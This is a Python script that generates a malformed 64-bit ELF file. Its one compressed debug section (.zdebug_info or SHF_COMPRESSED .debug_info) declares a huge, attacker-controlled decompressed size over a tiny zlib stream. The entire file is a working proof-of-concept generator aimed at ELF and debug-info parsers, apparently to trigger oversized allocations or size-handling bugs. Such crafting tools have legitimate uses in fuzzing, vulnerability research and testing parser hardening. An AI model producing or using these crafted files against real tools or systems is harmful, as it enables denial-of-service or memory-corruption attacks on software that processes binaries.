#!/usr/bin/env python3
"""Craft a minimal 64-bit little-endian ELF with one compressed debug section
whose declared decompressed size is attacker-controlled and huge.

mode=gnu : section named .zdebug_info, payload = b"ZLIB" + 8-byte BE size + tiny zlib
mode=shf : section named .debug_info with SHF_COMPRESSED flag, payload = Elf64_Chdr + tiny zlib
"""
import struct, sys, zlib, argparse

SHF_COMPRESSED = (1 << 11)
ELFCOMPRESS_ZLIB = 1

def build(mode, size):
    # tiny valid zlib stream (compresses a few bytes)
    raw = b"AAAA"
    z = zlib.compress(raw, 9)

    if mode == "gnu":
        secname = b".zdebug_info\x00"
        secdata = b"ZLIB" + struct.pack(">Q", size) + z
        sh_flags = 0
    elif mode == "shf":
        secname = b".debug_info\x00"
        # Elf64_Chdr: ch_type(u32) ch_reserved(u32) ch_size(u64) ch_addralign(u64)
        chdr = struct.pack("<IIQQ", ELFCOMPRESS_ZLIB, 0, size, 1)
        secdata = chdr + z
        sh_flags = SHF_COMPRESSED
    else:
        sys.exit("bad mode")

    # section header string table: \0 + secname + ".shstrtab\0"
    shstr = b"\x00" + secname + b".shstrtab\x00"
    name_off_sec = 1
    name_off_shstr = 1 + len(secname)

    # Layout:
    # [Ehdr 64][secdata][shstrtab][section headers]
    ehdr_size = 64
    shdr_size = 64

    off_secdata = ehdr_size
    off_shstr = off_secdata + len(secdata)
    off_shdrs = off_shstr + len(shstr)
    # align shdrs to 8
    pad = (8 - (off_shdrs % 8)) % 8
    off_shdrs += pad

    # 3 section headers: null, our section, shstrtab
    e_shnum = 3
    e_shstrndx = 2

    SHT_NULL = 0
    SHT_PROGBITS = 1
    SHT_STRTAB = 3

    # Section header 0: null
    sh0 = struct.pack("<IIQQQQIIQQ", 0,SHT_NULL,0,0,0,0,0,0,0,0)
    # Section header 1: our debug section
    sh1 = struct.pack("<IIQQQQIIQQ",
        name_off_sec, SHT_PROGBITS, sh_flags, 0,
        off_secdata, len(secdata), 0, 0, 1, 0)
    # Section header 2: shstrtab
    sh2 = struct.pack("<IIQQQQIIQQ",
        name_off_shstr, SHT_STRTAB, 0, 0,
        off_shstr, len(shstr), 0, 0, 1, 0)

    e_ident = b"\x7fELF" + bytes([2,1,1,0]) + b"\x00"*8
    ehdr = e_ident + struct.pack("<HHIQQQIHHHHHH",
        2,        # e_type ET_EXEC
        0x3e,     # e_machine x86-64
        1,        # e_version
        0,        # e_entry
        0,        # e_phoff
        off_shdrs,# e_shoff
        0,        # e_flags
        ehdr_size,# e_ehsize
        0,        # e_phentsize
        0,        # e_phnum
        shdr_size,# e_shentsize
        e_shnum,
        e_shstrndx)

    out = bytearray()
    out += ehdr
    assert len(out) == off_secdata
    out += secdata
    assert len(out) == off_shstr
    out += shstr
    out += b"\x00"*pad
    assert len(out) == off_shdrs, (len(out), off_shdrs)
    out += sh0 + sh1 + sh2
    return bytes(out)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--size", required=True)
    ap.add_argument("--mode", required=True, choices=["gnu","shf"])
    ap.add_argument("-o", required=True)
    a = ap.parse_args()
    size = int(a.size, 0)
    data = build(a.mode, size)
    open(a.o, "wb").write(data)
    print(f"wrote {a.o} mode={a.mode} declared_size={size} (0x{size:x}) file={len(data)} bytes")
